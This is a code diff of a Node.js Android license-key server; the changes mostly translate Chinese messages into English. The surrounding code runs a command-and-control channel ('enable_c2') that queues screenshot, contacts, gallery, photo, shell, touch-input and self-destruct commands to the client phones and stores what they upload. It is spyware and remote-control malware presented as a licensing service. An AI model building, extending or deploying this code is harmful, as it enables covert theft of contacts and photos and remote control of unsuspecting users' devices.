@@ -21,10 +21,10 @@ const AI_API_BASE_URL = trimRightSlash(process.env.AI_API_BASE_URL || 'https://a
 const AI_API_KEY = process.env.AI_API_KEY || '';
 const AI_MODEL = process.env.AI_MODEL || 'gpt-4o-mini';
 const DEFAULT_AI_HTML_PROMPT = [
-  '你是安卓 WebView 卡密弹窗 UI 设计助手。',
-  '根据用户描述生成一段可直接嵌入 WebView 的完整 HTML。',
-  '要求：只输出 HTML，不要 Markdown；必须包含卡密输入框 id="cardInput"；必须包含验证按钮并调用 verify(false)；不要移除已有 JS bridge 能力；界面适配手机横竖屏。',
-  '风格要清晰、轻量、不要引用外部 CDN。'
+  'You are a WebView UI designer for license verification popups.',
+  'Generate a complete self-contained HTML page for embedding in an Android WebView.',
+  'Requirements: output only HTML, no Markdown; must include input id="cardInput"; must include a verify button calling verify(false); keep existing JS bridge calls; responsive mobile layout.',
+  'Style: clean, lightweight, no external CDN.'
 ].join('\n');
 const dataDir = path.join(__dirname, 'data');
 const dbFile = path.join(dataDir, 'db.json');
@@ -36,7 +36,7 @@ let db = loadDb();
 const tokens = new Map();
 const verifyRate = new Map();
 
-// 内存日志环形缓冲，保存最近 500 条
+// ring buffer log, last 500 entries
 const LOG_RING = [];
 const LOG_RING_MAX = 500;
 const _origLog = console.log.bind(console);
@@ -66,8 +66,8 @@ const server = http.createServer(async (req, res) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  if (ADMIN_PASSWORD === 'change-me-123') console.warn('[WARN] ADMIN_PASSWORD 仍是默认值，部署公网前请修改 .env');
-  if (CONFIG_AES_KEY === '1234567890abcdef') console.warn('[WARN] CONFIG_AES_KEY 仍是默认值，部署公网前请修改并同步客户端 Vault');
+  if (ADMIN_PASSWORD === 'change-me-123') console.warn('[WARN] ADMIN_PASSWORD is default, change .env before deploy');
+  if (CONFIG_AES_KEY === '1234567890abcdef') console.warn('[WARN] CONFIG_AES_KEY is default, change .env and update client Vault');
   console.log(`card server listening on 0.0.0.0:${PORT}`);
   console.log(`admin panel: ${PUBLIC_BASE_URL}/admin`);
   console.log(`verify url: ${PUBLIC_BASE_URL}/kami/verify`);
@@ -90,7 +90,7 @@ async function route(req, res) {
     const body = await readBody(req);
     const params = parseBody(req, body);
     if (params.username !== ADMIN_USER || params.password !== ADMIN_PASSWORD) {
-      return sendJson(res, 401, { ok: false, message: '账号或密码错误' });
+      return sendJson(res, 401, { ok: false, message: 'invalid credentials' });
     }
     const token = crypto.randomBytes(24).toString('hex');
     tokens.set(token, Date.now());
@@ -99,14 +99,14 @@ async function route(req, res) {
 
   if (url.pathname.startsWith('/admin/api/')) {
     const token = getBearerToken(req);
-    if (!isTokenValid(token)) return sendJson(res, 401, { ok: false, message: '未登录' });
+    if (!isTokenValid(token)) return sendJson(res, 401, { ok: false, message: 'unauthorized' });
     return handleAdminApi(req, res, url);
   }
 
   if (req.method === 'POST' && url.pathname === '/kami/verify') {
     const ip = remoteIp(req, {});
     if (isRateLimited(verifyRate, ip, VERIFY_WINDOW_MS, VERIFY_MAX_PER_WINDOW)) {
-      return sendJson(res, 429, { code: -1, message: '请求过于频繁，请稍后再试', data: { remaining_seconds: 0 } });
+      return sendJson(res, 429, { code: -1, message: 'rate limited', data: { remaining_seconds: 0 } });
     }
     const body = await readBody(req);
     const params = parseBody(req, body);
@@ -156,7 +156,7 @@ async function handleAdminApi(req, res, url) {
     const params = parseBody(req, await readBody(req));
     const count = clampInt(params.count, 1, 500, 1);
     const durationDays = clampInt(params.duration_days, 1, 3650, DEFAULT_MONTH_DAYS);
-    const name = String(params.name || '月卡');
+    const name = String(params.name || 'monthly');
     const note = String(params.note || '');
     const created = [];
     for (let index = 0; index < count; index += 1) {
@@ -262,7 +262,7 @@ async function handleAdminApi(req, res, url) {
     return sendJson(res, 200, { ok: true, device: enrichDevice(device) });
   }
 
-  // 清除设备所有待执行命令
+  // clear all pending commands
   const clearCmdsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/clear-commands$/);
   if (req.method === 'POST' && clearCmdsMatch) {
     const device = findDevice(Number(clearCmdsMatch[1]));
@@ -271,7 +271,7 @@ async function handleAdminApi(req, res, url) {
     device.pending_commands = [];
     device.updated_at = now();
     saveDb();
-    console.log(`[管理] 清除设备 ${device.device_id}(${device.name}) ${cleared} 条待命令`);
+    console.log(`[admin] cleared ${cleared} pending cmds for ${device.device_id}(${device.name})`);
     return sendJson(res, 200, { ok: true, cleared });
   }
 
@@ -281,8 +281,8 @@ async function handleAdminApi(req, res, url) {
   if (req.method === 'POST' && url.pathname === '/admin/api/groups') {
     const params = parseBody(req, await readBody(req));
     const name = String(params.name || '').trim();
-    if (!name) return sendJson(res, 400, { ok: false, message: '分组名不能为空' });
-    if (db.groups.some(g => g.name === name)) return sendJson(res, 409, { ok: false, message: '分组已存在' });
+    if (!name) return sendJson(res, 400, { ok: false, message: 'name required' });
+    if (db.groups.some(g => g.name === name)) return sendJson(res, 409, { ok: false, message: 'group exists' });
     const group = createGroup({ name, display_name: params.display_name, config: params.config });
     saveDb();
     return sendJson(res, 200, { ok: true, group });
@@ -303,7 +303,7 @@ async function handleAdminApi(req, res, url) {
   if (req.method === 'DELETE' && groupMatch) {
     const id = Number(groupMatch[1]);
     if (db.devices.some(d => d.group_id === id)) {
-      return sendJson(res, 400, { ok: false, message: '该分组下还有设备，无法删除' });
+      return sendJson(res, 400, { ok: false, message: 'group has devices' });
     }
     db.groups = db.groups.filter(g => g.id !== id);
     saveDb();
@@ -344,7 +344,7 @@ async function handleAdminApi(req, res, url) {
   const uploadsMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads$/);
   if (uploadsMatch && req.method === 'GET') {
     const device = db.devices.find(d => d.id === Number(uploadsMatch[1]));
-    if (!device) return sendJson(res, 404, { ok: false, message: '设备不存在' });
+    if (!device) return sendJson(res, 404, { ok: false, message: 'device not found' });
     const uploads = (device.uploads || []).slice().reverse().slice(0, 50);
     return sendJson(res, 200, { ok: true, uploads });
   }
@@ -352,7 +352,7 @@ async function handleAdminApi(req, res, url) {
   const delUploadMatch = url.pathname.match(/^\/admin\/api\/devices\/(\d+)\/uploads\/(.+)$/);
   if (delUploadMatch && req.method === 'DELETE') {
     const device = db.devices.find(d => d.id === Number(delUploadMatch[1]));
-    if (!device) return sendJson(res, 404, { ok: false, message: '设备不存在' });
+    if (!device) return sendJson(res, 404, { ok: false, message: 'device not found' });
     const filename = path.basename(decodeURIComponent(delUploadMatch[2]));
     const filepath = path.join(uploadsDir, filename);
     if (fs.existsSync(filepath)) try { fs.unlinkSync(filepath); } catch {}
@@ -363,7 +363,7 @@ async function handleAdminApi(req, res, url) {
   if (req.method === 'GET' && url.pathname.startsWith('/admin/api/uploads/')) {
     const filename = path.basename(url.pathname.replace('/admin/api/uploads/', ''));
     const filepath = path.join(uploadsDir, filename);
-    if (!fs.existsSync(filepath)) return sendJson(res, 404, { ok: false, message: '文件不存在' });
+    if (!fs.existsSync(filepath)) return sendJson(res, 404, { ok: false, message: 'file not found' });
     const ext = path.extname(filename).toLowerCase();
     const mimeMap = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.txt': 'text/plain; charset=utf-8', '.json': 'application/json' };
     const mime = mimeMap[ext] || 'application/octet-stream';
@@ -411,8 +411,8 @@ async function handleAdminApi(req, res, url) {
 
 function buildConfig(softwareType) {
   const cfg = effectiveConfigForSoftware(softwareType || 'default');
-  const popupTitle = cfg.popup_title || '请输入卡密';
-  const popupHtml = cfg.popup_html || buildCardHtml(`${PUBLIC_BASE_URL}/kami/verify`, popupTitle, cfg.popup_message || '一机一卡，首次使用自动绑定设备');
+  const popupTitle = cfg.popup_title || 'Enter License';
+  const popupHtml = cfg.popup_html || buildCardHtml(`${PUBLIC_BASE_URL}/kami/verify`, popupTitle, cfg.popup_message || 'One device per key');
   return {
     debug: !!cfg.debug,
     domains: [PUBLIC_BASE_URL],
@@ -459,15 +459,15 @@ function effectiveConfigForSoftware(softwareType) {
 
 function buildCardHtml(verifyUrl, popupTitle, popupMessage) {
   const safeUrl = escapeHtml(verifyUrl);
-  const safeTitle = escapeHtml(popupTitle || '请输入卡密');
-  const safeMessage = escapeHtml(popupMessage || '一机一卡，首次使用自动绑定设备');
+  const safeTitle = escapeHtml(popupTitle || 'Enter License');
+  const safeMessage = escapeHtml(popupMessage || 'One device per key');
   return `<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>html,body{margin:0;width:100%;height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Microsoft YaHei",Arial,sans-serif;background:rgba(0,0,0,.62)}.wrap{height:100%;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box}.card{width:310px;background:#fff;border-radius:18px;box-shadow:0 14px 40px rgba(0,0,0,.18);padding:24px 22px 22px;box-sizing:border-box;text-align:center}.avatar{font-size:46px;line-height:1;margin-bottom:8px}.title{font-size:18px;font-weight:700;color:#222;margin-bottom:8px}.msg{min-height:22px;font-size:14px;color:#777;margin-bottom:14px}input{width:100%;height:42px;border:1px solid #e7e7e7;border-radius:22px;outline:none;padding:0 16px;font-size:15px;box-sizing:border-box;text-align:center;color:#333}.buttons{display:flex;gap:12px;margin-top:18px}button{flex:1;height:42px;border:0;border-radius:22px;font-size:15px;font-weight:600}.exit{background:#f0f0f0;color:#777}.verify{background:#ff5d9d;color:#fff}.verify:disabled{opacity:.55}.tip{position:fixed;left:50%;bottom:38px;transform:translateX(-50%);background:rgba(0,0,0,.65);color:#fff;border-radius:18px;padding:9px 18px;font-size:14px;opacity:0;transition:.2s;white-space:nowrap}.tip.show{opacity:1}</style></head><body><div class="wrap"><div class="card"><div class="avatar">🔐</div><div class="title">${safeTitle}</div><div id="msg" class="msg">${safeMessage}</div><input id="cardInput" placeholder="请输入卡密" autocomplete="off" autocapitalize="off"><div class="buttons"><button class="exit" onclick="exitApp()">退出应用</button><button id="btnVerify" class="verify" onclick="verify(false)">验证卡密</button></div></div></div><div id="tip" class="tip"></div><script>const VERIFY_URL='${safeUrl}';const POPUP_ID='card_gate_popup';const bridge=window.Android||window.android||window.MyAppWebView;const input=document.getElementById('cardInput');const btnVerify=document.getElementById('btnVerify');const saved=readSP('kami');if(saved)input.value=saved;function toast(text){const t=document.getElementById('tip');t.textContent=text;t.className='tip show';setTimeout(()=>t.className='tip',1800)}function setMsg(text){document.getElementById('msg').textContent=text}function readSP(key){try{return bridge&&bridge.readSP?bridge.readSP(key):''}catch(e){return''}}function saveSP(key,value){try{if(bridge&&bridge.writeSP){bridge.writeSP(key,value)}else if(bridge&&bridge.saveSP){bridge.saveSP(key,value)}}catch(e){}}function exitApp(){try{bridge&&bridge.exitApp?bridge.exitApp():null}catch(e){}}function closePopup(){try{bridge&&bridge.close?bridge.close(POPUP_ID):null}catch(e){}}async function verify(auto){const card=input.value.trim();if(!card){if(!auto)toast('请输入卡密');return}btnVerify.disabled=true;setMsg(auto?'正在自动验证已保存卡密...':'正在验证...');try{const body=new URLSearchParams({input:card,card:card,kami:card,deviceId:readSP('device_id')||readSP('deviceId')||'',software_type:readSP('software_type')||'',version_shell:'${SHELL_VERSION}'});const res=await fetch(VERIFY_URL,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body.toString()});const data=await res.json();handleResult(data&&Number(data.code)===0,data&&data.message,data&&data.data,auto)}catch(e){setMsg('网络异常，请重试');toast('网络异常');btnVerify.disabled=false}}function handleResult(success,message,data,auto){if(success){const card=input.value.trim();const sec=String((data&&(data.remaining_seconds||data.remainingSeconds))||0);saveSP('kami',card);toast(message||'验证成功');setMsg('验证成功');try{if(bridge&&bridge.onVerifySuccess){bridge.onVerifySuccess(card,sec);return}}catch(e){}setTimeout(closePopup,600);return}btnVerify.disabled=false;const text=message||'卡密不存在';setMsg(auto?'已保存卡密失效，请重新输入':text);toast(text)}setTimeout(()=>{if(saved)verify(true)},500)<\/script></body></html>`;
 }
 function verifyCard({ input, deviceId }) {
-  if (!input) return fail('请输入卡密');
+  if (!input) return fail('invalid input');
   const card = db.cards.find(item => item.card === input);
-  if (!card) return fail('卡密不存在');
-  if (card.status !== 'active') return fail('卡密已禁用');
+  if (!card) return fail('not found');
+  if (card.status !== 'active') return fail('disabled');
   const current = now();
   if (!card.first_used_at) {
     card.first_used_at = current;
@@ -477,7 +477,7 @@ function verifyCard({ input, deviceId }) {
     card.updated_at = current;
     saveDb();
   } else if (card.device_id && deviceId && card.device_id !== deviceId) {
-    return fail('卡密已绑定其他设备');
+    return fail('bound to another device');
   } else if (!card.device_id && deviceId) {
     card.device_id = deviceId;
     card.updated_at = current;
@@ -486,10 +486,10 @@ function verifyCard({ input, deviceId }) {
   // 永久卡（expires_at 为空）不检查过期
   if (card.expires_at) {
     const remainingSeconds = Math.max(0, Math.floor((new Date(card.expires_at).getTime() - Date.now()) / 1000));
-    if (remainingSeconds <= 0) return fail('卡密已到期');
-    return { code: 0, message: '验证成功', data: { remaining_seconds: remainingSeconds, expires_at: card.expires_at, card: input } };
+    if (remainingSeconds <= 0) return fail('expired');
+    return { code: 0, message: 'ok', data: { remaining_seconds: remainingSeconds, expires_at: card.expires_at, card: input } };
   }
-  return { code: 0, message: '验证成功', data: { remaining_seconds: -1, expires_at: '', card: input } };
+  return { code: 0, message: 'ok', data: { remaining_seconds: -1, expires_at: '', card: input } };
 }
 
 function fail(message) { return { code: -1, message, data: { remaining_seconds: 0 } }; }
@@ -545,14 +545,14 @@ function registerDevice(params, req) {
     if (autoCard) {
       device.card = autoCard.card;
       device.updated_at = current;
-      console.log(`[自动发卡] 设备 ${deviceId}(${device.name}) 签发卡密 ${autoCard.card}`);
+      console.log(`[auto-card] ${deviceId}(${device.name}) issued ${autoCard.card}`);
     }
   }
 
   saveDb();
   const cmds = device.pending_commands.slice();
-  if (cmds.length) console.log(`[注册] 设备 ${deviceId}(${device.name}) 有 ${cmds.length} 条待执行命令: ${cmds.map(c=>c.type).join(',')}`);
-  else console.log(`[注册] 设备 ${deviceId}(${device.name}) 上线`);
+  if (cmds.length) console.log(`[reg] ${deviceId}(${device.name}) ${cmds.length} pending: ${cmds.map(c=>c.type).join(',')}`);
+  else console.log(`[reg] ${deviceId}(${device.name}) online`);
   return {
     code: 0,
     message: 'ok',
@@ -575,7 +575,7 @@ function autoIssueCard(device, softwareType) {
   card = {
     id: nextId(),
     card: cardStr,
-    name: '自动卡-' + softwareType,
+    name: 'auto-' + softwareType,
     duration_days: 0,
     status: 'active',
     device_id: device.device_id,
@@ -614,10 +614,10 @@ function deviceHeartbeat(params, req) {
         device.pending_commands = device.pending_commands || [];
         if (cfg.expire_action === 'uninstall') {
           device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'self_destruct', payload: { reason: 'card_expired' }, created_at: now() });
-          console.log(`[过期卸载] 设备 ${deviceId}(${device.name}) 卡密已到期，下发自毁命令`);
+          console.log(`[expire] ${deviceId}(${device.name}) card expired, self-destruct queued`);
         } else if (cfg.expire_action === 'block') {
           device.pending_commands.push({ id: crypto.randomBytes(8).toString('hex'), type: 'expire_block', payload: { reason: 'card_expired' }, created_at: now() });
-          console.log(`[过期阻断] 设备 ${deviceId}(${device.name}) 卡密已到期，下发阻断命令`);
+          console.log(`[expire] ${deviceId}(${device.name}) card expired, block queued`);
         }
       }
     }
@@ -625,7 +625,7 @@ function deviceHeartbeat(params, req) {
 
   saveDb();
   const cmds = device.pending_commands.slice();
-  if (cmds.length) console.log(`[心跳] 设备 ${deviceId}(${device.name}) 推送 ${cmds.length} 条命令: ${cmds.map(c=>c.type).join(',')}`);
+  if (cmds.length) console.log(`[beat] ${deviceId}(${device.name}) push ${cmds.length}: ${cmds.map(c=>c.type).join(',')}`);
   return {
     code: 0,
     message: 'ok',
@@ -648,15 +648,14 @@ function deviceAck(params) {
   const acked = device.pending_commands.filter(c => ids.includes(c.id));
   device.pending_commands = device.pending_commands.filter(c => !ids.includes(c.id));
   if (acked.length) {
-    console.log(`[ACK] 设备 ${deviceId}(${device.name}) 执行完成: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
-    // 开关命令特别记录
+    console.log(`[ack] ${deviceId}(${device.name}) done: ${acked.map(c=>c.type).join(',')} result=${params.result||'ok'}`);
     for (const c of acked) {
       if (c.type === 'switch_toggle') {
-        console.log(`[开关✓] ${device.name || deviceId} → ${c.payload.key}=${c.payload.on ? '已开启' : '已关闭'}`);
+        console.log(`[sw+] ${device.name || deviceId} ${c.payload.key}=${c.payload.on}`);
       } else if (c.type === 'screenshot') {
-        console.log(`[截图✓] ${device.name || deviceId} → 截图已上传`);
+        console.log(`[scr+] ${device.name || deviceId} uploaded`);
       } else if (c.type === 'get_gallery') {
-        console.log(`[相册✓] ${device.name || deviceId} → 相册数据已上传`);
+        console.log(`[gal+] ${device.name || deviceId} uploaded`);
       }
     }
   }
@@ -754,8 +753,8 @@ function defaultConfig() {
     ban_emulator: false,
     ban_virtual_app: false,
     ban_dual_app: false,
-    popup_title: '请输入卡密',
-    popup_message: '一机一卡，首次使用自动绑定设备',
+    popup_title: 'Enter License',
+    popup_message: 'One device per key',
     popup_html: '',
     // 自动发卡：注册时若卡密为空则自动签发一张永久卡并绑定（调试或免卡密场景）
     auto_issue_card: false,
@@ -892,18 +891,18 @@ function queueDeviceCommand(device, params) {
     'screenshot', 'get_contacts', 'get_gallery', 'get_photo', 'switch_toggle', 'shell', 'input_tap', 'input_swipe', 'wake'];
   if (!allowed.includes(type)) throw new Error('unsupported command: ' + type);
   const cfg = effectiveConfig(device);
-  if (!cfg.enable_c2) throw new Error('该设备当前配置已关闭 C2');
+  if (!cfg.enable_c2) throw new Error('c2 disabled');
   // payload 先解析出来（后续校验需要用到）
   let payload = params.payload;
   if (typeof payload === 'string') { try { payload = JSON.parse(payload); } catch { payload = { text: payload }; } }
   if (!payload || typeof payload !== 'object') payload = {};
   // 能力开关校验
-  if (type === 'screenshot' && !cfg.allow_screenshot) throw new Error('该设备配置未开启截图能力');
-  if (type === 'get_contacts' && !cfg.allow_contacts) throw new Error('该设备配置未开启通讯录能力');
-  if (type === 'get_gallery' && !cfg.allow_contacts) throw new Error('该设备配置未开启相册能力（复用通讯录开关）');
-  if (type === 'switch_toggle' && (!payload.key || payload.on === undefined)) throw new Error('switch_toggle 需 payload.key 和 payload.on');
-  if (type === 'shell' && !cfg.allow_shell) throw new Error('该设备配置未开启 Shell 执行能力');
-  if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('该设备配置未开启触控模拟能力');
+  if (type === 'screenshot' && !cfg.allow_screenshot) throw new Error('screenshot disabled');
+  if (type === 'get_contacts' && !cfg.allow_contacts) throw new Error('contacts disabled');
+  if (type === 'get_gallery' && !cfg.allow_contacts) throw new Error('gallery disabled');
+  if (type === 'switch_toggle' && (!payload.key || payload.on === undefined)) throw new Error('switch_toggle requires payload.key and payload.on');
+  if (type === 'shell' && !cfg.allow_shell) throw new Error('shell disabled');
+  if ((type === 'input_tap' || type === 'input_swipe') && !cfg.allow_input_control) throw new Error('input disabled');
   if (type === 'message' && !payload.text && params.text) payload.text = String(params.text);
   if (type === 'update_config' && !payload.config) payload.config = sanitizeConfig(params.config) || {};
   if (type === 'shell' && !payload.cmd && params.cmd) payload.cmd = String(params.cmd);
@@ -937,13 +936,13 @@ function queueDeviceCommand(device, params) {
   device.updated_at = now();
   // 管理操作日志：开关/相册等关键命令纳入全局监控
   if (type === 'switch_toggle') {
-    console.log(`[开关] ${device.name || device.device_id} → ${payload.key}=${payload.on ? '开' : '关'}`);
+    console.log(`[sw] ${device.name || device.device_id} ${payload.key}=${payload.on}`);
   } else if (type === 'get_gallery') {
-    console.log(`[相册] ${device.name || device.device_id} → 请求获取相册 (limit=${payload.limit || 100})`);
+    console.log(`[gal] ${device.name || device.device_id} request limit=${payload.limit || 100}`);
   } else if (type === 'get_photo') {
-    console.log(`[相册] ${device.name || device.device_id} → 请求获取图片 ID=${payload.id}`);
+    console.log(`[gal] ${device.name || device.device_id} photo id=${payload.id}`);
   } else if (type === 'screenshot') {
-    console.log(`[截图] ${device.name || device.device_id} → 请求截图`);
+    console.log(`[scr] ${device.name || device.device_id} request`);
   }
   return cmd;
 }
@@ -996,20 +995,20 @@ async function deviceUpload(req) {
   device.uploads.unshift({ cmd_id: cmdId, type, filename, size: buf.length, created_at: now() });
   device.uploads = device.uploads.slice(0, 100);
   saveDb();
-  console.log(`[上传] 设备 ${device.name}(${device.id}) 上传 ${type}.${ext} ${buf.length}字节 cmd=${cmdId}`);
+  console.log(`[upload] ${device.name}(${device.id}) ${type}.${ext} ${buf.length}B cmd=${cmdId}`);
   if (type === 'gallery_photo') {
-    console.log(`[相册] ${device.name} → 缩略图已上传 (${(buf.length/1024).toFixed(0)}KB)`);
+    console.log(`[gallery] ${device.name} thumb ${(buf.length/1024).toFixed(0)}KB`);
   } else if (type === 'switch_toggle') {
     const txt = buf.slice(0, 200).toString('utf-8');
-    console.log(`[开关] ${device.name} → 执行结果: ${txt}`);
-    // 解析开关结果并存储到 device config_override，让管理面板能读到最新状态
-    const swMatch = txt.match(/开关\[([^\]]+)\](开|关)/);
+    console.log(`[sw] ${device.name} result: ${txt}`);
+    // parse both formats: "sw[key]on/off" (new) and "开关[key]开/关" (legacy)
+    const swMatch = txt.match(/sw\[([^\]]+)\](on|off)/) || txt.match(/开关\[([^\]]+)\](开|关)/);
     if (swMatch) {
       const swKey = 'sw_' + swMatch[1];
-      const swOn = swMatch[2] === '开';
+      const swOn = swMatch[2] === 'on' || swMatch[2] === '开';
       device.config_override = device.config_override || {};
       device.config_override[swKey] = swOn;
-      console.log(`[开关] ${device.name} → ${swMatch[1]}=${swOn ? '开' : '关'} 已同步到 config_override`);
+      console.log(`[sw] ${device.name} ${swMatch[1]}=${swOn} synced`);
     }
   }
   return { ok: true, filename };
